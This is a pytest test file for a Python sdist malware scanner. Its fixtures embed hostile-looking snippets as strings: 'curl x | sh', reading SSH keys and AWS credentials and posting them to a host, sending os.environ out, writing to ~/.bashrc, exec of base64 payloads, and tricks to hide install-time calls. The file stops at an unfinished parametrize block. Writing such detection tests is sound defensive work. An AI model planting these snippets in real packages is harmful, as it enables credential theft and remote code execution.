import pytest

from buckthorn.findings import verdict
from buckthorn.scan import scan_sdist

PLAIN_SETUP = "from setuptools import setup\nsetup(name='pkg', version='1.0')\n"


def _rules(findings):
    return sorted(f.rule_id for f in findings)


def test_plain_setup_py_is_clean(make_sdist):
    findings = scan_sdist(make_sdist({"setup.py": PLAIN_SETUP}))
    assert findings == []
    assert verdict(findings) == "clean"


def test_pyproject_only_sdist_is_clean(make_sdist):
    toml = '[build-system]\nrequires = ["hatchling"]\nbuild-backend = "hatchling.build"\n'
    findings = scan_sdist(make_sdist({"pyproject.toml": toml}))
    assert verdict(findings) == "clean"
    assert _rules(findings) == ["BKT-INSTALL-009"]


def test_build_requirements_are_named_in_an_info_note(make_sdist):
    """pip fetches and runs these at install, and they are not read here."""
    toml = '[build-system]\nrequires = ["setuptools>=61", "evil-helper==6.6"]\n'
    (note,) = scan_sdist(make_sdist({"pyproject.toml": toml}))
    assert (note.rule_id, note.severity.value) == ("BKT-INSTALL-009", "info")
    assert "setuptools>=61, evil-helper==6.6" in note.message


def test_many_build_requirements_are_cut_short(make_sdist):
    names = ", ".join(f'"p{i}"' for i in range(30))
    toml = f"[build-system]\nrequires = [{names}]\n"
    (note,) = scan_sdist(make_sdist({"pyproject.toml": toml}))
    assert "p9" in note.message and "p10" not in note.message and "20 more" in note.message


@pytest.mark.parametrize("requires", ["[]", '"setuptools"', "[1, 2]"])
def test_no_note_without_a_list_of_names(make_sdist, requires):
    toml = f"[build-system]\nrequires = {requires}\n"
    assert scan_sdist(make_sdist({"pyproject.toml": toml})) == []


@pytest.mark.parametrize(
    ("extra", "rule", "severity"),
    [
        (
            "import urllib.request\nurllib.request.urlopen('http://x/p.py')\n",
            "BKT-INSTALL-001",
            "high",
        ),
        ("import subprocess\nsubprocess.run(['cmake', '.'])\n", "BKT-INSTALL-002", "medium"),
        ("exec(payload)\n", "BKT-INSTALL-003", "medium"),
        ("open(os.path.expanduser('~/.ssh/id_rsa')).read()\n", "BKT-INSTALL-004", "high"),
        ("open(os.path.expanduser('~/.bashrc'), 'a').write('x')\n", "BKT-INSTALL-005", "high"),
        ("import os\nenv = dict(os.environ)\n", "BKT-INSTALL-006", "info"),
    ],
)
def test_setup_py_capabilities(make_sdist, extra, rule, severity):
    findings = scan_sdist(make_sdist({"setup.py": extra + PLAIN_SETUP}))
    assert _rules(findings) == [rule]
    assert findings[0].severity.value == severity
    assert findings[0].file_path == "pkg-1.0/setup.py"


def test_install_hooks_in_cmdclass_functions_count(make_sdist):
    source = (
        "import subprocess\nfrom setuptools import setup\n"
        "from setuptools.command.install import install\n"
        "class Post(install):\n    def run(self):\n"
        "        subprocess.Popen('curl x | sh', shell=True)\n"
        "setup(name='pkg', version='1.0', cmdclass={'install': Post})\n"
    )
    rules = _rules(scan_sdist(make_sdist({"setup.py": source})))
    assert rules == ["BKT-INSTALL-001", "BKT-INSTALL-002"]


def test_secrets_plus_network_is_critical(make_sdist):
    source = (
        "import os, requests\n"
        "requests.post('http://x', data=open(os.path.expanduser('~/.aws/credentials')).read())\n"
    )
    findings = scan_sdist(make_sdist({"setup.py": source + PLAIN_SETUP}))
    assert "BKT-INSTALL-008" in _rules(findings)
    assert max(f.severity.value == "critical" for f in findings)


def test_bulk_environ_plus_network_is_critical(make_sdist):
    source = "import os, requests\nrequests.post('http://x', json=dict(os.environ))\n"
    findings = scan_sdist(make_sdist({"setup.py": source + PLAIN_SETUP}))
    assert _rules(findings) == ["BKT-INSTALL-001", "BKT-INSTALL-006", "BKT-INSTALL-008"]


def test_one_finding_per_kind_per_file(make_sdist):
    source = "import os\nos.system('a')\nos.system('b')\n"
    findings = scan_sdist(make_sdist({"setup.py": source + PLAIN_SETUP}))
    assert _rules(findings) == ["BKT-INSTALL-002"]
    assert findings[0].metadata["lines"] == [2, 3]


def test_setup_py_that_will_not_parse_is_not_verified(make_sdist):
    findings = scan_sdist(make_sdist({"setup.py": "print 'python 2'\n"}))
    assert _rules(findings) == ["BKT-SKIP-003"]
    assert verdict(findings) == "not_verified"


def test_setup_py_in_another_encoding_is_read(make_sdist):
    source = "# -*- coding: latin-1 -*-\nimport os\nos.system('caf\xe9')\n".encode("latin-1")
    assert _rules(scan_sdist(make_sdist({"setup.py": source}))) == ["BKT-INSTALL-002"]


def test_setup_py_deeper_in_the_tree_is_not_the_install_script(make_sdist):
    members = {"setup.py": PLAIN_SETUP, "vendor/x/setup.py": "import os\nos.system('x')\n"}
    assert scan_sdist(make_sdist(members)) == []


def test_in_tree_build_backend_fires_and_is_read(make_sdist):
    toml = '[build-system]\nrequires = []\nbuild-backend = "backend"\nbackend-path = ["_build"]\n'
    backend = "import os\nos.system('curl x | sh')\ndef build_wheel(*a): pass\n"
    findings = scan_sdist(make_sdist({"pyproject.toml": toml, "_build/backend.py": backend}))
    assert _rules(findings) == ["BKT-INSTALL-001", "BKT-INSTALL-002", "BKT-INSTALL-007"]
    assert verdict(findings) == "flagged"
    assert {f.file_path for f in findings} == {
        "pkg-1.0/pyproject.toml",
        "pkg-1.0/_build/backend.py",
    }


def test_in_tree_backend_as_a_package(make_sdist):
    toml = '[build-system]\nbuild-backend = "be.api"\nbackend-path = ["."]\n'
    members = {"pyproject.toml": toml, "be/api/__init__.py": "exec(x)\n"}
    assert _rules(scan_sdist(make_sdist(members))) == ["BKT-INSTALL-003", "BKT-INSTALL-007"]


def test_bad_pyproject_is_not_verified(make_sdist):
    assert _rules(scan_sdist(make_sdist({"pyproject.toml": "[build-system\n"}))) == ["BKT-SKIP-003"]


def test_pkg_info_mismatch_fires(make_sdist):
    members = {"setup.py": PLAIN_SETUP, "PKG-INFO": "Name: requests\nVersion: 1.0\n"}
    assert _rules(scan_sdist(make_sdist(members))) == ["BKT-META-001"]


def test_dashed_names_in_sdist_file_names(make_sdist):
    path = make_sdist({"setup.py": PLAIN_SETUP}, "my-pkg-2.0.tar.gz")
    assert scan_sdist(path) == []


def test_in_tree_backend_alone_is_an_info_note(make_sdist):
    # pyyaml, pillow, charset-normalizer and setuptools all wrap setuptools this way.
    toml = '[build-system]\nbuild-backend = "_wrap"\nbackend-path = ["."]\n'
    members = {"pyproject.toml": toml, "_wrap.py": "from setuptools.build_meta import *\n"}
    findings = scan_sdist(make_sdist(members))
    assert _rules(findings) == ["BKT-INSTALL-007"]
    assert verdict(findings) == "clean"


# setup.py calling into a local module runs that module's function at install.
# Shapes from the DataDog corpus: tiketoken, pip-doom, crytic-compilers.
MAIN_PY = (
    "import urllib.request\ndef helper():\n    pass\n"
    "def main():\n    urllib.request.urlopen('http://x')\n"
)


@pytest.mark.parametrize(
    "members",
    [
        {  # from main import main, inside a custom install command
            "setup.py": "from setuptools.command.install import install\n"
            "class I(install):\n    def run(self):\n        from main import main\n        main()\n"
            + PLAIN_SETUP,
            "main.py": MAIN_PY,
        },
        {  # a function in a module of a local package
            "setup.py": "from doom.game import main\nmain()\n" + PLAIN_SETUP,
            "doom/__init__.py": "",
            "doom/game.py": MAIN_PY,
        },
        {  # a local submodule, then an attribute call on it
            "setup.py": "from doom import game\ngame.main()\n" + PLAIN_SETUP,
            "doom/__init__.py": "",
            "doom/game.py": MAIN_PY,
        },
        {  # import pkg.mod as m; m.main()
            "setup.py": "import doom.game as g\ng.main()\n" + PLAIN_SETUP,
            "doom/__init__.py": "",
            "doom/game.py": MAIN_PY,
        },
    ],
)
def test_functions_setup_py_imports_from_local_modules_count_at_install(make_sdist, members):
    findings = scan_sdist(make_sdist(members))
    assert _rules(findings) == ["BKT-INSTALL-001"]
    assert findings[0].file_path.endswith(".py") and "setup.py" not in findings[0].file_path


def test_local_module_imported_by_setup_py_is_read_at_top_level(make_sdist):
    members = {
        "setup.py": "import doom.game\n" + PLAIN_SETUP,
        "doom/__init__.py": "",
        "doom/game.py": "import os\nos.system('x')\n",
    }
    assert _rules(scan_sdist(make_sdist(members))) == ["BKT-INSTALL-002"]


def test_unused_functions_of_a_local_module_do_not_count(make_sdist):
    # from pkg import __version__ is the common case: the package's functions do not run.
    members = {
        "setup.py": "from pkg import __version__\n" + PLAIN_SETUP,
        "pkg/__init__.py": "import os\n__version__ = '1.0'\ndef f():\n    os.system('x')\n",
    }
    assert scan_sdist(make_sdist(members)) == []


# Package modules in an sdist are installed, so they run at import like a wheel's.
# Shapes from the DataDog corpus: randomized, litellm 1.82.7, reverse-shell 0.1.
@pytest.mark.parametrize(
    ("members", "rule"),
    [
        ({"pkg/__init__.py": "import os\nos.system('x')\n"}, "BKT-IMPORT-002"),
        (
            {"pkg/__init__.py": "", "pkg/sub/__init__.py": "", "pkg/sub/m.py": "exec(x)\n"},
            "BKT-IMPORT-003",
        ),
        ({"src/pkg/__init__.py": "import requests\nrequests.get('http://x')\n"}, "BKT-IMPORT-001"),
        (  # hidden code counts wherever it is, as in a wheel
            {
                "pkg/__init__.py": "",
                "pkg/rand.py": "import base64\ndef f():\n"
                "    exec(base64.b64decode(b'cHJpbnQoMSk='))\n",
            },
            "BKT-HIDE-001",
        ),
        (  # a called function runs at import (G2)
            {
                "pkg/__init__.py": "import subprocess\ndef _go():\n"
                "    subprocess.Popen(['x'])\n_go()\n"
            },
            "BKT-IMPORT-002",
        ),
    ],
)
def test_sdist_package_modules_are_read_as_import_code(make_sdist, members, rule):
    findings = scan_sdist(make_sdist({"setup.py": PLAIN_SETUP, **members}))
    assert _rules(findings) == [rule]


@pytest.mark.parametrize(
    "members",
    [
        # functions nobody calls at import
        {"pkg/__init__.py": "import os\ndef f():\n    os.system('x')\n"},
        # a folder that is not a package is not installed as one
        {"scripts/tool.py": "import os\nos.system('x')\n"},
        # root-level tests and docs packages are usually left out of the build
        {"tests/__init__.py": "", "tests/test_x.py": "import os\nos.system('x')\n"},
        {"docs/__init__.py": "", "docs/conf.py": "import subprocess\nsubprocess.run(['git'])\n"},
        # dev folders at the root, and test folders at any depth (black, yt_dlp, scipy)
        {"scripts/__init__.py": "", "scripts/gha.py": "import os\nos.system('x')\n"},
        {"devscripts/__init__.py": "", "devscripts/x.py": "import os\nos.system('x')\n"},
        {
            "pkg/__init__.py": "",
            "pkg/sub/__init__.py": "",
            "pkg/sub/tests/__init__.py": "",
            "pkg/sub/tests/gen.py": "import os\nos.system('x')\n",
        },
        {"tests_integ/__init__.py": "", "tests_integ/t.py": "import os\nos.system('x')\n"},
    ],
)
def test_sdist_files_that_are_not_installed_package_code_are_not_read(make_sdist, members):
    assert scan_sdist(make_sdist({"setup.py": PLAIN_SETUP, **members})) == []


def test_module_read_as_install_code_is_not_reported_again_at_import(make_sdist):
    members = {
        "setup.py": "import doom.game\n" + PLAIN_SETUP,
        "doom/__init__.py": "",
        "doom/game.py": "import os\nos.system('x')\n",
    }
    assert _rules(scan_sdist(make_sdist(members))) == ["BKT-INSTALL-002"]


def test_top_level_txt_packages_are_read(make_sdist):
    members = {
        "setup.py": PLAIN_SETUP,
        "pkg.egg-info/top_level.txt": "pkg\nscripts\n",
        "scripts/__init__.py": "import os\nos.system('x')\n",
    }
    # named in top_level.txt, so installed even though the folder name is a dev one
    assert _rules(scan_sdist(make_sdist(members))) == ["BKT-IMPORT-002"]


def test_top_level_txt_cannot_hide_a_package(make_sdist):
    # top_level.txt is written by the uploader: listing a decoy must not hide the payload.
    members = {
        "setup.py": PLAIN_SETUP,
        "pkg.egg-info/top_level.txt": "decoy\n",
        "evil/__init__.py": "import os\nos.system('x')\n",
    }
    assert _rules(scan_sdist(make_sdist(members))) == ["BKT-IMPORT-002"]


NODE_GYP = "node_modules/npm/node_modules/node-gyp/gyp/gyp_main.py"


def test_a_declared_folder_no_import_statement_can_name_is_a_note(make_sdist):
    # pycasbin: top_level.txt names node_modules, and a file deep in it runs a
    # process at its top level. No import statement can name node-gyp.
    members = {
        "setup.py": PLAIN_SETUP,
        "pkg.egg-info/top_level.txt": "casbin\nnode_modules\n",
        "casbin/__init__.py": "import os\nNAME = 'gyp'\n",
        NODE_GYP: "import subprocess\nsubprocess.run(['x'])\n",
    }
    findings = scan_sdist(make_sdist(members))
    assert [(f.rule_id, f.severity.value) for f in findings] == [("BKT-IMPORT-002", "info")]
    assert verdict(findings) == "clean"


@pytest.mark.parametrize(
    "where",
    [
        ("casbin/__init__.py", "import importlib\nimportlib.import_module(MOD)\n"),
        ("setup.py", "import importlib\nimportlib.import_module(MOD)\n" + PLAIN_SETUP),
    ],
)
def test_a_folder_no_import_statement_can_name_counts_when_named_by_string(make_sdist, where):
    file, source = where
    source = source.replace("MOD", repr(NODE_GYP[:-3].replace("/", ".")))
    members = {
        "setup.py": PLAIN_SETUP,
        "pkg.egg-info/top_level.txt": "casbin\nnode_modules\n",
        "casbin/__init__.py": "",
        NODE_GYP: "import subprocess\nsubprocess.run(['x'])\n",
    } | {file: source}
    assert verdict(scan_sdist(make_sdist(members))) == "flagged"


def test_an_execd_version_file_runs_only_its_top_level(make_sdist):
    setup = (
        "import os\nroot = os.path.dirname(os.path.abspath(__file__))\n"
        "with open(os.path.join(root, 'pkg', 'about.py')) as f:\n    about = {}\n"
        "    exec(f.read(), about)\n" + PLAIN_SETUP
    )
    quiet = "import os\n__version__ = '1.0'\ndef f():\n    os.system('x')\n"
    assert scan_sdist(make_sdist({"setup.py": setup, "pkg/about.py": quiet})) == []
    loud = "import os\nos.system('x')\n"
    findings = scan_sdist(make_sdist({"setup.py": setup, "pkg/about.py": loud}))
    assert [(f.rule_id, f.file_path) for f in findings] == [
        ("BKT-INSTALL-002", "pkg-1.0/pkg/about.py")
    ]


def test_top_level_txt_does_not_bring_back_nested_test_folders(make_sdist):
    # nltk and setuptools name their package in top_level.txt; its test/ stays out.
    members = {
        "setup.py": PLAIN_SETUP,
        "pkg.egg-info/top_level.txt": "pkg\n",
        "pkg/__init__.py": "",
        "pkg/test/__init__.py": "",
        "pkg/test/unit/__init__.py": "",
        "pkg/test/unit/t.py": "import os\nos.system('x')\n",
    }
    assert scan_sdist(make_sdist(members)) == []


def test_exec_of_an_absolute_path_is_not_matched_to_a_shipped_decoy(make_sdist):
    # /tmp/p is not pkg-1.0/tmp/p: the decoy in the archive must not stand in for it.
    members = {
        "setup.py": "exec(open('/tmp/p').read())\n" + PLAIN_SETUP,
        "tmp/p": "x = 1\n",
    }
    assert _rules(scan_sdist(make_sdist(members))) == ["BKT-INSTALL-003"]


# setup.py that puts src/ on sys.path, then calls into a package there, runs that
# code at install. Shapes from the hooktest and mlc-ai-nightly samples.
@pytest.mark.parametrize(
    ("members", "path"),
    [
        (
            {
                "setup.py": "import os, sys\n"
                "sys.path.insert(0, os.path.join(os.path.dirname(__file__), 'src'))\n"
                "from setuptools.command.install import install\n"
                "class I(install):\n    def run(self):\n"
                "        from hook import trigger\n        trigger()\n" + PLAIN_SETUP,
                "src/hook/__init__.py": "from .main import main\ndef trigger():\n    main()\n",
                "src/hook/main.py": MAIN_PY,
            },
            "src/hook/main.py",
        ),
        (
            {
                "setup.py": "import sys\nfrom setuptools.command.install import install\n"
                "class I(install):\n    def run(self):\n        sys.path.insert(0, 'src')\n"
                "        from pob.run import main\n        main(b'x')\n" + PLAIN_SETUP,
                "src/pob/__init__.py": "",
                "src/pob/run.py": MAIN_PY,
            },
            "src/pob/run.py",
        ),
    ],
)
def test_functions_setup_py_calls_in_src_packages_count_at_install(make_sdist, members, path):
    findings = scan_sdist(make_sdist(members))
    assert [(f.rule_id, f.file_path) for f in findings] == [("BKT-INSTALL-001", f"pkg-1.0/{path}")]
    assert "called at install" in findings[0].message


def test_version_import_from_a_src_package_stays_clean(make_sdist):
    members = {
        "setup.py": "import sys\nsys.path.insert(0, 'src')\nfrom pkg import __version__\n"
        + PLAIN_SETUP,
        "src/pkg/__init__.py": "import os\n__version__ = '1.0'\ndef f():\n    os.system('x')\n",
    }
    assert scan_sdist(make_sdist(members)) == []


# Code the sdist says it installs is read even with no __init__.py: a namespace
# package, a package literally named src, a declared loose module
# (glovo-data-platform, modulelibraryV1, httpsreqfast, owlmoon).
@pytest.mark.parametrize(
    ("members", "path"),
    [
        (  # a namespace package named in top_level.txt
            {
                "pkg.egg-info/top_level.txt": "ns\n",
                "ns/sub/__init__.py": "import urllib.request\nurllib.request.urlopen('http://x')\n",
            },
            "ns/sub/__init__.py",
        ),
        (  # a package called src
            {
                "pkg.egg-info/top_level.txt": "src\n",
                "src/__init__.py": "import os\nos.system('x')\n",
            },
            "src/__init__.py",
        ),
        (  # a src/ with its own __init__.py is a package called src
            {"src/__init__.py": "", "src/m.py": "import os\nos.system('x')\n"},
            "src/m.py",
        ),
        (  # a package under a literal package_dir root
            {
                "setup.py": "from setuptools import setup\n"
                "setup(name='pkg', package_dir={'': 'lib'})\n",
                "lib/pkg/__init__.py": "import os\nos.system('x')\n",
            },
            "lib/pkg/__init__.py",
        ),
        (  # a loose module under src/ named in top_level.txt
            {"pkg.egg-info/top_level.txt": "tool\n", "src/tool.py": "import os\nos.system('x')\n"},
            "src/tool.py",
        ),
        (  # setup.py packages=, a folder without __init__.py
            {
                "setup.py": "from distutils.core import setup\n"
                "setup(name='pkg', packages=['owl'])\n",
                "owl/tests.py": "import os\nos.system('x')\n",
            },
            "owl/tests.py",
        ),
        (  # distutils packages given as paths, under a package called src
            {
                "setup.py": "from distutils.core import setup\n"
                "setup(name='pkg', packages=['src', 'src/utils'])\n",
                "src/__init__.py": "",
                "src/init.py": "import os\nos.system('x')\n",
            },
            "src/init.py",
        ),
        (  # a package given as a relative path
            {
                "setup.py": "from setuptools import setup\nsetup(name='pkg', packages=['./owl'])\n",
                "owl/x.py": "import os\nos.system('x')\n",
            },
            "owl/x.py",
        ),
        (  # py_modules with package_dir
            {
                "setup.py": "from setuptools import setup\n"
                "setup(name='pkg', py_modules=['tool'], package_dir={'': 'lib'})\n",
                "lib/tool.py": "import os\nos.system('x')\n",
            },
            "lib/tool.py",
        ),
    ],
)
def test_declared_modules_without_init_are_read_as_import_code(make_sdist, members, path):
    findings = scan_sdist(make_sdist({"setup.py": PLAIN_SETUP, **members}))
    assert [(f.rule_id[:11], f.file_path) for f in findings] == [("BKT-IMPORT-", f"pkg-1.0/{path}")]


def test_calls_are_followed_in_a_package_called_src(make_sdist):
    members = {
        "setup.py": PLAIN_SETUP,
        "pkg.egg-info/top_level.txt": "src\n",
        "src/__init__.py": "from src.helper import go\ngo()\n",
        "src/helper.py": "import os\ndef go():\n    os.system('x')\n",
    }
    findings = scan_sdist(make_sdist(members))
    assert [(f.rule_id, f.file_path) for f in findings] == [
        ("BKT-IMPORT-002", "pkg-1.0/src/helper.py")
    ]
    assert "called at import by pkg-1.0/src/__init__.py" in findings[0].message


def test_calls_are_followed_across_a_namespace_package(make_sdist):
    members = {
        "setup.py": PLAIN_SETUP,
        "pkg.egg-info/top_level.txt": "ns\n",
        "ns/a/__init__.py": "from ns.b.m import f\nf()\n",
        "ns/b/m.py": "import os\ndef f():\n    os.system('x')\n",
    }
    findings = scan_sdist(make_sdist(members))
    assert [(f.rule_id, f.file_path) for f in findings] == [("BKT-IMPORT-002", "pkg-1.0/ns/b/m.py")]


# Undeclared folders without __init__.py stay unread: build helpers, vendored
# trees and samples (aioboto3, blake3, rapidfuzz, typing_extensions), and a
# declared package's test folder (tornado).
@pytest.mark.parametrize(
    "members",
    [
        {"resources/make_pr.py": "import requests\nrequests.get('http://x')\n"},
        {"c_impl/setup.py": "import subprocess\nsubprocess.run(['cc'])\n"},
        {"extern/lib/tools/amalgamation.py": "import subprocess\nsubprocess.run(['x'])\n"},
        {"src/test_x.py": "exec('1')\n"},
        {
            "setup.py": "from setuptools import setup\n"
            "setup(name='pkg', packages=['pkg', 'pkg.test'])\n",
            "pkg/__init__.py": "",
            "pkg/test/t.py": "import os\nos.system('x')\n",
        },
        {  # py_modules names a file, not the folder of the same name
            "setup.py": "from setuptools import setup\nsetup(name='pkg', py_modules=['tests'])\n",
            "tests/x.py": "import os\nos.system('x')\n",
        },
    ],
)
def test_undeclared_folders_without_init_stay_unread(make_sdist, members):
    assert scan_sdist(make_sdist({"setup.py": PLAIN_SETUP, **members})) == []


# setup.py code pip never runs: commands it does not run, blocks for such a
# command on the command line, and functions nothing that runs calls. Shown as
# notes, not install code. Shapes from the held-out benign triage.
HEAD = "import os, sys\nfrom setuptools import setup, Command\n"
PUBLISH = (
    "class Publish(Command):\n"
    "    '''Publish to PyPI.'''\n"
    "    user_options = []\n"
    "    def initialize_options(self):\n        pass\n"
    "    def finalize_options(self):\n        pass\n"
    "    def run(self):\n        os.system('twine upload dist/*')\n"
)


def _install_rules(findings):
    return sorted((f.rule_id, f.severity.value) for f in findings)


@pytest.mark.parametrize(
    "source",
    [
        PUBLISH + "setup(name='pkg', cmdclass={'publish': Publish})\n",
        PUBLISH.replace("publish", "lint") + "setup(name='pkg', cmdclass={'lint': Publish})\n",
        PUBLISH + "setup(name='pkg', cmdclass=dict(upload=Publish, test=Publish))\n",
        # class attributes that only hold literals, and the class's own docstring
        PUBLISH.replace(
            "user_options = []", "user_options = [('x=', None, 'y')]\n    description = __doc__"
        )
        + "setup(name='pkg', cmdclass={'publish': Publish})\n",
        PUBLISH + "CMDS = {'publish': Publish}\nsetup(name='pkg', cmdclass=CMDS)\n",
        # setup() inside main(), run under __main__ as pip runs setup.py (avro)
        PUBLISH + "def main():\n    setup(name='pkg', cmdclass={'lint': Publish})\n"
        "if __name__ == '__main__':\n    main()\n",
        # a command class nothing registers
        PUBLISH + "setup(name='pkg')\n",
        # a helper only that command calls
        "def release():\n    os.system('twine upload dist/*')\n"
        + PUBLISH.replace("os.system('twine upload dist/*')", "release()")
        + "setup(name='pkg', cmdclass={'publish': Publish})\n",
        # a block for a command on the command line (Arpeggio)
        "if sys.argv[-1].startswith('publish'):\n    os.system('twine upload dist/*')\n"
        "    sys.exit()\nsetup(name='pkg')\n",
        "if 'upload' in sys.argv:\n    os.system('twine upload dist/*')\nsetup(name='pkg')\n",
        "if len(sys.argv) > 1 and sys.argv[1] == 'tag':\n    os.system('git tag v1')\n"
        "setup(name='pkg')\n",
        # a function whose only call is commented out (clickclick)
        "def check_deps():\n    '''check licenses'''\n    os.system('pip-licenses')\n"
        "# check_deps()\nsetup(name='pkg')\n",
        # a mapping passed to something other than setup() (clickclick's pytest.main)
        "def check_deps():\n    os.system('pip-licenses')\n"
        "import pytest\nopts = {'a': 1}\nopts['b'] = 2\npytest.main(**opts)\n"
        "setup(name='pkg', **{'version': '1.0'})\n",
    ],
)
def test_setup_py_code_pip_never_runs_is_a_note(make_sdist, source):
    # aliases for commands pip does not run change nothing (Arpeggio, avro)
    cfg = "[aliases]\nrelease = sdist bdist_wheel upload\ntest = pytest\n"
    findings = scan_sdist(make_sdist({"setup.py": HEAD + source, "setup.cfg": cfg}))
    assert _install_rules(findings) == [("BKT-INSTALL-002", "info")]
    assert "not at install" in findings[0].message
    assert verdict(findings) == "clean"


@pytest.mark.parametrize(
    "source",
    [
        # commands pip runs, and their sub-commands
        PUBLISH + "setup(name='pkg', cmdclass={'install': Publish})\n",
        PUBLISH + "setup(name='pkg', cmdclass={'build_ext': Publish})\n",
        PUBLISH + "setup(name='pkg', cmdclass={'egg_info': Publish, 'publish': Publish})\n",
        PUBLISH + "setup(name='pkg', cmdclass=dict(bdist_wheel=Publish))\n",
        PUBLISH + "setup(name='pkg', cmdclass={'develop': Publish})\n",
        PUBLISH + "setup(name='pkg', cmdclass={'install_lib': Publish})\n",
        # a name not known until it runs
        PUBLISH + "setup(name='pkg', cmdclass={'inst' + 'all': Publish})\n",
        PUBLISH + "K = 'install'\nsetup(name='pkg', cmdclass={K: Publish})\n",
        # the class used any other way
        PUBLISH + "Publish(None).run()\nsetup(name='pkg')\n",
        PUBLISH + "C = {'publish': Publish}\nC['install'] = C['publish']\n"
        "setup(name='pkg', cmdclass=C)\n",
        PUBLISH + "setup(name='pkg', cmdclass=wrap({'publish': Publish}))\n",
        PUBLISH + "class Install(Publish):\n    pass\n"
        "setup(name='pkg', cmdclass={'install': Install, 'publish': Publish})\n",
        # run by a command pip runs
        PUBLISH + "from setuptools.command.install import install\n"
        "class Install(install):\n    def run(self):\n        self.run_command('publish')\n"
        "setup(name='pkg', cmdclass={'install': Install, 'publish': Publish})\n",
        # a base, metaclass or decorator whose code is not read here
        PUBLISH.replace("(Command)", "(Release)")
        + "from tools import Release\nsetup(name='pkg', cmdclass={'publish': Publish})\n",
        PUBLISH.replace("(Command)", "(Command, metaclass=M)")
        + "setup(name='pkg', cmdclass={'publish': Publish})\n",
        "class Base(Command):\n    def __init_subclass__(cls):\n        cls.run(None)\n"
        + PUBLISH.replace("(Command)", "(Base)")
        + "setup(name='pkg', cmdclass={'publish': Publish})\n",
        "@register\n" + PUBLISH + "setup(name='pkg', cmdclass={'publish': Publish})\n",
        # commands set or looked up by name at run time
        PUBLISH + "sys.argv.append('publish')\nsetup(name='pkg', cmdclass={'publish': Publish})\n",
        PUBLISH + "setup(name='pkg', script_args=['publish'], cmdclass={'publish': Publish})\n",
        PUBLISH + "KW = {'cmdclass': {'publish': Publish}}\nsetup(name='pkg', **opts)\n",
        PUBLISH + "run = setup\nrun(name='pkg', **opts)\n",
        PUBLISH + "import functools\nfunctools.partial(setup, script_args=A)()\n",
        PUBLISH + "from setuptools.command.install import install\n"
        "class Install(install):\n    def run(self):\n        self.run_command(NAME)\n"
        "setup(name='pkg', cmdclass={'install': Install, 'publish': Publish})\n",
        PUBLISH + "from setuptools.command.build import build\n"
        "class Build(build):\n    sub_commands = build.sub_commands + [(NAME, None)]\n"
        "setup(name='pkg', cmdclass={'build': Build, 'publish': Publish})\n",
        # gates that run at install
        "if 'install' in sys.argv:\n    os.system('x')\nsetup(name='pkg')\n",
        "if sys.argv[1] != 'publish':\n    os.system('x')\nsetup(name='pkg')\n",
        "if sys.argv[1] == 'publish' or sys.argv[1] == 'build':\n    os.system('x')\n"
        "setup(name='pkg')\n",
        "if sys.argv[1] == 'publish':\n    pass\nelse:\n    os.system('x')\nsetup(name='pkg')\n",
        "if sys.argv[-1].startswith('b'):\n    os.system('x')\nsetup(name='pkg')\n",
        "if sys.argv[-1] == '--record':\n    os.system('x')\nsetup(name='pkg')\n",
        "if 'publish' in sys.argv: os.system('x')\nsetup(name='pkg')\n",
        # functions reached some way other than a plain call
        "def go():\n    os.system('x')\nhooks = [go]\nhooks[0]()\nsetup(name='pkg')\n",
        "def go():\n    os.system('x')\nglobals()['g' + 'o']()\nsetup(name='pkg')\n",
        "def go():\n    os.system('x')\nimport setup as me\ngetattr(me, NAME)()\n"
        "setup(name='pkg')\n",
        "def go():\n    os.system('x')\neval('go()')\nsetup(name='pkg')\n",
        "def go():\n    os.system('x')\nexec(CODE)\nsetup(name='pkg')\n",
        "@atexit.register\ndef go():\n    os.system('x')\nsetup(name='pkg')\n",
        "def go():\n    os.system('x')\nsys._getframe().f_globals['g' + 'o']()\n"
        "setup(name='pkg')\n",
        # found by review: a lookup named in a string, or imported by its own name
        "import builtins\ndef go():\n    os.system('x')\n"
        "getattr(builtins, 'globals')()['g' + 'o']()\nsetup(name='pkg')\n",
        "from gc import get_objects\ndef go():\n    os.system('x')\n"
        "[o for o in get_objects() if getattr(o, '__name__', '') == N][0]()\nsetup(name='pkg')\n",
        # a substring of one argv item, not a whole command
        "if 'wheel' in sys.argv[1]:\n    os.system('x')\nsetup(name='pkg')\n",
        # a sys that is not the sys module
        "import types\nsys = types.SimpleNamespace(argv=['s', 'publish'])\n"
        "if 'publish' in sys.argv:\n    os.system('x')\nsetup(name='pkg')\n",
        # found by security review: the class body runs its own methods
        PUBLISH + "    run(None)\nsetup(name='pkg', cmdclass={'publish': Publish})\n",
        PUBLISH + "    @run\n    def other(self):\n        pass\n"
        "setup(name='pkg', cmdclass={'publish': Publish})\n",
        PUBLISH + "    def other(self, _=run(None)):\n        pass\n"
        "setup(name='pkg', cmdclass={'publish': Publish})\n",
        "class Hook:\n    def __set_name__(self, owner, name):\n        owner.run(None)\n"
        + PUBLISH.replace("user_options = []", "hook = Hook()")
        + "setup(name='pkg', cmdclass={'publish': Publish})\n",
        "from hooks import HOOK\n"
        + PUBLISH.replace("user_options = []", "hook = HOOK")
        + "setup(name='pkg', cmdclass={'publish': Publish})\n",
        # argv[0] is setup.py or a path under pip, and argv[-2] can be argv[0]
        "if sys.argv[0].startswith('setup'):\n    os.system('x')\nsetup(name='pkg')\n",
        "if sys.argv[-2].startswith('setup'):\n    os.system('x')\nsetup(name='pkg')\n",
        "if sys.argv[1].startswith('C'):\n    os.system('x')\nsetup(name='pkg')\n",
        # legacy pip runs setup.py clean --all after a failed bdist_wheel
        PUBLISH + "setup(name='pkg', cmdclass={'clean': Publish})\n",
        "if 'clean' in sys.argv:\n    os.system('x')\nsetup(name='pkg')\n",
        # code in a return annotation runs when the function is defined
        "def publish(\n) -> (\n  os.system('x')): pass\nsetup(name='pkg')\n",
    ],
)
def test_setup_py_code_pip_may_run_still_counts(make_sdist, source):
    findings = scan_sdist(make_sdist({"setup.py": HEAD + source}))
    assert ("BKT-INSTALL-002", "medium") in _install_rules(findings)


@pytest.mark.parametrize(
    "source",
    [
        "import subprocess\nsubprocess.run([sys.executable, 'setup.py', 'publish'])\n"
        "if 'publish' in sys.argv:\n    open(os.path.expanduser('~/.ssh/id_rsa')).read()\n"
        "setup(name='pkg')\n",
        "import subprocess\nsubprocess.run([sys.executable, 'setup.py', 'publishing'])\n"
        "if sys.argv[1].startswith('publish'):\n"
        "    open(os.path.expanduser('~/.ssh/id_rsa')).read()\nsetup(name='pkg')\n",
        PUBLISH.replace("os.system('twine upload dist/*')", "open('/root/.ssh/id_rsa').read()")
        + "os.system('python setup.py publish')\n"
        "setup(name='pkg', cmdclass={'publish': Publish})\n",
    ],
)
